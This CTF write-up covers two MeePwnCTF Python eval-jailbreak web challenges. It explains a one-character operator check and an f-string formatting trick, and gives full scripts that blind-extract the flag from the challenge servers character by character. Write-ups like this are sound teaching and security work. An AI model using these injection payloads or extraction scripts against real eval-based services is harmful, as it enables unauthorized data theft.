# PyCalcX (web)

Those were almost identical challenges, and in fact the first one had a simpler, unintended, solution and therefore another version was released.

## PyCalcX (64 solved, 100p)

In the first challenge we get access to a webpage which can evaluate some python for us.
The flag is loaded into the memory, so we basically have a Python Jailbreak to solve.
We get the [source code](calc1.py) of the challenge.

The important things are:

1. We can see only integer or boolean output.
2. Parameters are sanitized, and stringified.
3. Types of parameters have to match.
4. The final payload to eval is `str(repr(value1)) + str(op) + str(repr(value2))` which means for example `'a' + '+' + 'b'`

The vulnerability is here:

```python
    def get_op(val):
        val = str(val)[:2]
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
            sys.exit(0)
        return val
```

The `operator` can be 2-bytes long (like `==`), but only the first byte is checked!
This means for example that we can use operator `+'` and therefore close the `'` quote.

This means we could evaluate: `'SOMETHING' +''+FLAG and FLAG>source#'` which means `some_string and boolean`, which evaluates to the value of this boolean.

Keep in mind we're using the:

```python
if 'source' in arguments:
    source = arguments['source'].value
```

And not for example `value1` variable, because `source` has no blacklist limitations.

```python
import re
import string
import urllib

import requests


def main():
    flag = "M"
    while True:
        prev = 0
        for i in range(255):
            c = chr(i)
            if c in string.printable:
                source = urllib.quote_plus(flag + c)
                op = urllib.quote_plus("+'")
                arg2 = urllib.quote_plus("+FLAG and FLAG>source#")
                result = requests.get("http://178.128.96.203/cgi-bin/server.py?source=%s&value1=x&op=%s&value2=%s" % (source, op, arg2)).text
                if ">>>>" in result:
                    res = re.findall(">>>>.*", result, re.DOTALL)[0]
                    if "False" in res:
                        flag += prev
                        print(flag)
                        break
                    else:
                        prev = c


main()
```

We check every character until the flag becomes bigger than our payload, which means that previous character was the right one, and we can start working on next flag position.
It takes a while but in the end we get: `MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])`

## PyCalcX2 (54 solved, 100p)

Second level of the challenge is very similar.
We also get the [source code](calc2.py)

The difference is very tiny:

```python
op = get_op(get_value(arguments['op'].value))
```

Which means the operator also passes via blacklist, and therefore cannot contain `'` any more.
But we can still inject something behind the operator!

We guessed that our first solution was unintended, but the flag suggested that intended solution has something to do with new Python features.
We looked at release notes and we found an interesting article: https://www.python.org/dev/peps/pep-0498/

There is a `f` modifier for strings, which allows to do some nice evaluation inside strings.
We could for example do `f'{FLAG}'` and it would place the variable value inside the string.
However since we can't escape from `'` we can't really create any boolean condition anymore.

It took us a while to figure out the approach, but we finally reched: `'T' +f'ru{FLAG>source or 14:x}'`

- We use the short circuit `or` to get one of the two results, depending on the result of first comparison. Basically `True or 14` returns `True` and `False or 14` returns 14.
- We use `x` modifier to turn 14 into hex digit `e`
- The string `f'ru{FLAG>source or 14:x}'` therefore evaluates to either `ru1` or `rue`, depending on the `FLAG>source` condition
- The result of evaluation will be either `Tru1` or `True`, and in the second case, we will se the result on the page, because it will be treated as boolean.

```python
import re
import string
import urllib

import requests


def main():
    flag = "M"
    while True:
        prev = 0
        for i in range(255):
            c = chr(i)
            if c in string.printable:
                print('testing', c)
                arg1 = urllib.quote_plus("T")
                op = urllib.quote_plus("+f")
                arg2 = urllib.quote_plus("ru{FLAG>source or 14:x}")
                result = requests.get("http://206.189.223.3/cgi-bin/server.py?source=%s&value1=%s&op=%s&value2=%s" % (flag + c, arg1, op, arg2)).text
                if ">>>>" in result:
                    res = re.findall(">>>>.*", result, re.DOTALL)[0]
                    if "True" in res:
                        flag += prev
                        print(flag)
                        break
                    else:
                        prev = c


main()
```

The rest of the approach is the same as in previous challenge.
After a while we get: `MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}`
